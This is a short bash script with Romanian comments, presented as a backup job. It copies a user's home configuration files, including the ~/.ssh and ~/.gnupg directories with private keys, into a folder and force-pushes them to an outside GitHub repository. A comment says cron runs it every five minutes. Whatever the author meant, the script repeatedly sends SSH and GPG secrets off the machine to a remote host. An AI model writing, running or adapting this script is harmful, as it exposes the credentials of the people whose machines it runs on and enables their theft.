#!/bin/bash

repository_dir="repo"

read -p "Nume de utilizator: " author_name

# Mesajul pentru commit
commit_message="Adaugate fisierele în repository"

# URL-ul repository-ului GitHub
github_url="https://github.com/AlexKiwe/BackupsRepo.git"

if [ ! -d "$repository_dir" ]
then
        mkdir "$repository_dir"
fi

cd "$repository_dir"


file_conf="$author_name.conf"
file_bash="$author_name.bash"
file_pr="$author_name.pr"
file_bl="$author_name.bl"
file_ssh="$author_name.ssh"
file_gnupg="$author_name.gnupg"


cp -r ~/.config "$file_conf"
cp ~/.bashrc "$file_bash"
cp ~/.profile "$file_pr"
cp ~/.bash_logout "$file_bl"
cp -r ~/.ssh "$file_ssh"
cp -r ~/.gnupg "$file_gnupg"

# Incarcam pe github fisierele de sistem
# Scriptul este rulat la fiecare 5 minute printr-un cronjob
git init
git add .
git remote add origin https://github.com/AlexKiwe/BackupsRepo.git
git commit -m "$commit_message"


git checkout -b main
git fetch origin main
git push --force -u origin main 
